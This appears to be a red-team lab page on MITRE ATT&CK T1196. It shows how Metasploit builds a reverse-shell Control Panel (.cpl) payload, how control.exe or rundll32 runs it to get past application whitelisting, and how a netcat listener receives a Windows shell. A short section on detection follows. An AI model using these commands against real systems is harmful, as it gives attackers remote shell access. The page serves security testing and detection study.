---
description: Control Panel Item code execution - bypass application whitelisting.
---

# T1196: Control Panel Item

## Execution

Generating a simple x64 reverse shell in a .cpl format:

{% code title="attacker@local" %}
```csharp
msfconsole
use windows/local/cve_2017_8464_lnk_lpe
set payload windows/x64/shell_reverse_tcp
set lhost 10.0.0.5
exploit

root@~# nc -lvp 4444
listening on [any] 4444 ...
```
{% endcode %}

We can see that the .cpl is simply a DLL with DllMain function exported:

![](../../.gitbook/assets/lnk-dllmain%20%281%29.png)

A quick look at the dissasembly of the dll suggests that rundll32.exe will be spawned, a new thread will be created in suspended mode, which most likely will get injected with our shellcode and eventually resumed to execute that shellcode:

![](../../.gitbook/assets/lnk-dissasm.png)

Invoking the shellcode via control.exe:

{% code title="attacker@victim" %}
```csharp
control.exe .\FlashPlayerCPLApp.cpl
# or
rundll32.exe shell32.dll,Control_RunDLL file.cpl
# or
rundll32.exe shell32.dll,Control_RunDLLAsUser file.cpl
```
{% endcode %}

Attacking machine receiving the reverse shell:

{% code title="attacker@local" %}
```csharp
10.0.0.2: inverse host lookup failed: Unknown host
connect to [10.0.0.5] from (UNKNOWN) [10.0.0.2] 49346
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
```
{% endcode %}

## Observations

Note how rundll32 spawns cmd.exe and establishes a connection back to the attacker - these are signs that should raise your suspicion when investingating a host for a compromise:

![](../../.gitbook/assets/lnk-connection.png)

As always, sysmon logging can help in finding suspicious commandlines being executed in your environment:

![](../../.gitbook/assets/lnk-sysmon%20%281%29.png)

## Bonus - Create Shortcut With PowerShell

```bash
$TargetFile = "$env:SystemRoot\System32\calc.exe"
$ShortcutFile = "C:\experiments\cpl\calc.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$Shortcut.TargetPath = $TargetFile
$Shortcut.Save()
```

## References

{% embed url="https://attack.mitre.org/wiki/Technique/T1196" %}

{% embed url="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1060/T1060.md" %}

